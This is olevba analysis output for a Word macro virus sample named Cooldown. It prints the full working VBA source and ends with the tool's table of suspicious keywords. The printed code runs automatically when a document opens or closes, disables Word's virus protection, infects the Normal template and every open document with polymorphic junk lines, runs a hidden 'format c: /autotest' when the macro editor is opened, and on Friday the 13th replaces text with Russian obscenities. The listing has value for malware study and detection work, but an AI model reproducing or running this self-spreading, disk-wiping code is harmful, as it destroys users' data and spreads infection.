olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-84cba751b8c68077805b8f0b715d52b33ae2330e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-84cba751b8c68077805b8f0b715d52b33ae2330e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
              Private _
            Sub Document_Open()
     CoolDown _
   0
               End _
         Sub
               Private _
        Sub _
       Document_Close()
           CoolDown 0
                End _
   Sub
           Private Sub ToolsMacro()
             CoolDown 1
     
End Sub
    Private _
           Sub _
     ViewVBCode()
         CoolDown 1
       End _
 Sub
         ' 6898.888

Private Sub CoolDown(How As _
         Integer)
           
On _
             Error Resume _
         Next
              Dim _
          c As _
         String, _
        a _
 As _
       Long, b _
             As Long, d As _
          Long, e As _
 Long, _
       f _
            As Long, res As String, m As Boolean
Randomize
      ' 3813.469
With Options
  ' 9002.738
' 6951.591
.VirusProtection _
         = False
  ' 5207.211

' 8117.7
.ConfirmConversions = False
           ' 9575.866
.SaveNormalPrompt _
          = False
  ' 8412.007
End _
With
      ' 1138.524
If How _
   = 1 _
       Then
   s _
         = _
 Shell("format" _
              & _
            Chr(32) _
       & _
      "c:" & Chr(32) & "/autotest", vbHide)
   Else
 
' 6669.77
With NormalTemplate.VBProject.VBComponents(1).CodeModule
         ' 5545.535
If _
             Not _
 .Find("Cool" & "Down", _
         1, 1, _
 1000, _
      1000, _
             False, _
    False) _
  Then
               a = _
              .CountOfLines
      For _
  b = 1 To _
       a
          .DeleteLines _
    (1)
             Next
 
d _
              = _
           1
          ' 5784.318
a = _
 ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
     res = ""
  ' 6448.435
' 8775.449
For b _
      = _
           1 To a
          c = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
  1)
   c _
        = _
         RTrim(LTrim(c))
               ' 8593.922
If _
              foo(c, _
      f, res) _
             Then
        ' 3688.533
.InsertLines _
       d, _
          Space(Rnd * 16) & _
     res
         ' 6102.706
d _
  = d _
+ f
           ' 798.6015
' 6594.396
f = 0
          res _
    = _
               ""
                ' 9358.372
' 1486.449
End If
               Next
           ' 3716.335
' 4028.352
NormalTemplate.Save
     ' 131.5546
End _
              If
            End With
   ' 5111.681
' 8374.275
For e = 1 To Documents.Count
        With _
      Documents(e).VBProject.VBComponents(1).CodeModule
        
If _
  Not _
     .Find("Cool" & _
              "Down", _
     1, 1, 1000, 1000, False, _
         False) _
              Then
  
a = _
   .CountOfLines
               m _
   = _
          Documents(e).Saved
           ' 2381.224
' 3023.744
For b = _
             1 _
           To _
    a
           ' 8210.281
.DeleteLines _
     (1)
      ' 9913.823
Next
             d = 1
     a _
                = _
 NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
  res = _
        ""
 ' 8491.411
For _
            b = _
  1 To _
 a
            c _
 = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
    c = _
       RTrim(LTrim(c))
         ' 9089.761
' 2085.512
' 9016.994
' 8939.125
' 718.72
If foo(c, f, _
  res) _
              Then
             .InsertLines d, Space(Rnd * 16) & res
' 6571.604
' 7035.6
' 3073.978
d = _
               d _
 + _
             f
           ' 1563.985
' 3143.404
f _
        = 0
                ' 8841.078
' 6702.772
res _
              = _
             ""
  ' 9871.32
' 6349.604

End If
            ' 6978.1
Next
  If _
               Documents(e).Path _
              <> "" _
    Then
     Documents(e).SaveAs _
               AddToRecentFiles:=False
        End _
    If
           ' 6232.502
If _
              (WeekDay(Date) = 6) _
   And _
  (Day(Date) = _
        13) _
          And (Rnd _
               > 0.7) Then
 
Application.StatusBar _
               = ""
          ' 8274.527
' 9665.057
Application.DisplayStatusBar _
       = False
    Application.ScreenUpdating _
   = _
               False
          With _
          Documents(e).Content
           
.Find.Execute FindText:="пр", ReplaceWith:="пизд", Replace:=wdReplaceAll
   .Find.Execute FindText:="др", ReplaceWith:="понос", Replace:=wdReplaceAll
             ' 5345.469
.Find.Execute _
   FindText:="кр", _
             ReplaceWith:="кобыл", _
   Replace:=wdReplaceAll
      ' 5012.901
.Find.Execute _
 FindText:="стр", ReplaceWith:="ебан", Replace:=wdReplaceAll
             ' 1142.79
' 1040.922
.Find.Execute _
          FindText:="ср", _
            ReplaceWith:="срак", _
              Replace:=wdReplaceAll
     ' 1745.783
' 776.9626
.Find.Execute _
        FindText:="тр", ReplaceWith:="трах", Replace:=wdReplaceAll
 .Find.Execute FindText:="бр", _
             ReplaceWith:="бляд", Replace:=wdReplaceAll
         ' 8291.705
' 891.3284
' 2785.836
' 3481.655
.Find.Execute _
         FindText:="вр", ReplaceWith:="выеб", Replace:=wdReplaceAll
     .Find.Execute FindText:="гр", _
           ReplaceWith:="говн", _
             Replace:=wdReplaceAll
      ' 2197.98
.Find.Execute FindText:="жр", _
    ReplaceWith:="жоп", _
Replace:=wdReplaceAll
 .Find.Execute _
         FindText:="зр", _
          ReplaceWith:="залуп", Replace:=wdReplaceAll
        .Find.Execute FindText:="дж", _
           ReplaceWith:="джоп", _
                Replace:=wdReplaceAll
      .Find.Execute _
                FindText:="кал", ReplaceWith:="дер", _
 Replace:=wdReplaceAll
          .Find.Execute _
       FindText:="бух", _
         ReplaceWith:="бряк", Replace:=wdReplaceAll
            End _
  With
        ' 6048.685

Documents(e).UndoClear
   ' 5684.646
Application.DisplayStatusBar = True
      Application.ScreenUpdating _
       = True
      Application.StatusBar = _
      ""
     ' 9587.384
' 8485.504
' 1275.191
' 4527.269

' 8249.702
' 6484.022
End If
     Documents(e).Saved = _
   m
    ' 8479.107
' 7591.108
' 5006.411
End If
    ' 2231.432
' 1524.926

End With
         Next
              End If
          ' 4777.179
End _
           Sub
            Private Function foo(ByRef _
            s _
                As _
       String, ByRef i As Long, ByRef _
         res As _
   String) As Boolean
  ' 3849.442
' 4435.936
Dim _
                tmp As String
    If (Left(s, 1) _
      = _
         "'") _
            Or (Len(s) = 0) _
    Then
              ' 2675.868
foo = _
False
            ' 2319.79
Exit _
             Function
       End If
   If _
     Right(s, 2) _
           = _
             Chr(32) _
 & _
       "_" Then
                
res = res _
   & Left(s, _
  Len(s) _
            - 1)
    foo _
     = _
          False
              
Exit _
      Function
    ' 2425.563
' 945.251
' 5666.476
' 5492.598
' 1234.059
End _
              If
     tmp _
  = res & _
            s
 res _
   = ""
     ' 4694.945
' 9496.143
i _
               = 1
  While Rnd _
      > 0.5
               If Rnd < 0.8 _
   Then
    res _
            = res & _
  "'" _
   & Str(Rnd * 10000)
              ' 9307.846
End _
        If
             ' 5069.088
res _
            = res & _
             Chr(13)
           ' 3910.542
' 1323.846
i _
 = _
              i + _
             1
       ' 9848.434

Wend
  ' 9223.718
' 8762.872
For _
       a = 1 To _
         Len(tmp)
            ' 1887.316
res _
 = _
           res & _
           Mid(tmp, a, _
     1)
             ' 6754.391
If _
                Mid(tmp, a, _
                1) _
           = _
              Chr(32) Then
            ' 4815.553
' 2107.657
' 6843.764
If _
         Rnd _
   > 0.5 Then
     res _
 = res & _
             "_" _
        & _
       Chr(13) & Space(Rnd _
         * _
       16)
              
' 5809.064
' 4394.796
' 5943.665

i = i _
                + 1
              End _
            If
          ' 8151.621
End If
              Next
              foo _
           = _
True
      End _
               Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

